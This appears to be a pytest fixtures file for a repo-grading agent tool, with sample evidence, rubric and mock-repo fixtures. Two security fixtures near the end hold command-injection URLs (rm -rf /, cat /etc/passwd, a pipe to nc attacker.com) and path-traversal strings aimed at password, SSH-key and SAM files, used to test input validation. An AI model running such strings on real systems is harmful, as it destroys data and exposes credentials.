"""
Pytest configuration and shared fixtures for all tests.
"""

import os
import tempfile
from pathlib import Path
from typing import Generator

import pytest

from src.core.state import AgentState, Evidence, JudicialOpinion, RubricConfig


@pytest.fixture(scope="session")
def test_env():
    """Set up test environment variables."""
    os.environ["OPENAI_API_KEY"] = "sk-test-key-for-unit-tests"
    os.environ["ANTHROPIC_API_KEY"] = "sk-ant-test-key-for-unit-tests"
    os.environ["LANGCHAIN_TRACING_V2"] = "false"
    os.environ["LOG_LEVEL"] = "ERROR"  # Reduce noise in tests
    os.environ["MAX_REPO_SIZE_MB"] = "100"  # Lower limits for tests
    os.environ["GIT_CLONE_TIMEOUT"] = "10"


@pytest.fixture
def temp_dir() -> Generator[Path, None, None]:
    """Create a temporary directory for tests."""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield Path(tmpdir)


@pytest.fixture
def sample_evidence() -> Evidence:
    """Create a sample Evidence object."""
    return Evidence(
        found=True,
        content="class AgentState(TypedDict): pass",
        location="src/state.py:10",
        confidence=0.95,
        detective_name="TestDetective",
        timestamp="2024-01-15T10:30:00",
    )


@pytest.fixture
def sample_opinion() -> JudicialOpinion:
    """Create a sample JudicialOpinion object."""
    return JudicialOpinion(
        judge="Prosecutor",
        criterion_id="forensic_accuracy_code",
        score=3,
        argument="The code demonstrates basic functionality but lacks comprehensive error handling.",
        cited_evidence=["TestDetective:src/state.py:10"],
        timestamp="2024-01-15T10:35:00",
    )


@pytest.fixture
def sample_rubric() -> dict:
    """Create a sample rubric for testing."""
    return {
        "rubric_metadata": {
            "rubric_name": "Test Rubric",
            "grading_target": "Test Target",
            "version": "1.0.0",
        },
        "dimensions": [
            {
                "id": "test_criterion",
                "name": "Test Criterion",
                "target_artifact": "github_repo",
                "forensic_instruction": "Test instruction",
                "judicial_logic": {
                    "prosecutor": "Be harsh",
                    "defense": "Be generous",
                    "tech_lead": "Be pragmatic",
                },
            }
        ],
        "synthesis_rules": {
            "security_override": "Security flaws cap score at 3",
            "fact_supremacy": "Facts over opinions",
            "dissent_requirement": "Document disagreements",
        },
    }


@pytest.fixture
def sample_agent_state(sample_rubric) -> AgentState:
    """Create a sample AgentState for testing."""
    return {
        "repo_url": "https://github.com/test/repo",
        "pdf_path": "test_report.pdf",
        "rubric": RubricConfig(**sample_rubric),
        "evidences": {},
        "opinions": [],
        "aggregated_evidence": None,
        "final_scores": {},
        "synthesis_summary": "",
        "final_report": "",
        "execution_start_time": None,
        "execution_end_time": None,
        "errors": [],
    }


@pytest.fixture
def mock_git_repo(temp_dir: Path) -> Path:
    """Create a mock git repository structure."""
    repo_dir = temp_dir / "test_repo"
    repo_dir.mkdir()

    # Create basic structure
    (repo_dir / "src").mkdir()
    (repo_dir / "src" / "__init__.py").touch()

    # Create a sample Python file
    state_file = repo_dir / "src" / "state.py"
    state_file.write_text("""
from typing import TypedDict
from pydantic import BaseModel

class AgentState(TypedDict):
    data: str

class Evidence(BaseModel):
    found: bool
    content: str
""")

    return repo_dir


@pytest.fixture
def mock_pdf_file(temp_dir: Path) -> Path:
    """Create a mock PDF file for testing."""
    pdf_path = temp_dir / "test_report.pdf"
    # Create a minimal PDF structure
    pdf_content = b"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
xref
0 4
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
trailer
<< /Size 4 /Root 1 0 R >>
startxref
190
%%EOF
"""
    pdf_path.write_bytes(pdf_content)
    return pdf_path


@pytest.fixture
def malicious_urls() -> list:
    """Sample malicious URLs for security testing."""
    return [
        "https://github.com/test/repo; rm -rf /",
        "https://github.com/test/repo && cat /etc/passwd",
        "https://github.com/test/repo | nc attacker.com 4444",
        "https://evil.com/repo.git",
        "file:///etc/passwd",
    ]


@pytest.fixture
def path_traversal_attempts() -> list:
    """Sample path traversal attempts for security testing."""
    return [
        "../../etc/passwd",
        "../../../root/.ssh/id_rsa",
        "..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\SAM",
    ]


# Markers for different test categories
def pytest_configure(config):
    """Configure custom pytest markers."""
    config.addinivalue_line("markers", "slow: marks tests as slow (deselect with '-m \"not slow\"')")
    config.addinivalue_line("markers", "integration: marks tests as integration tests")
    config.addinivalue_line("markers", "security: marks tests as security-focused")
    config.addinivalue_line("markers", "requires_api: marks tests that require API keys")
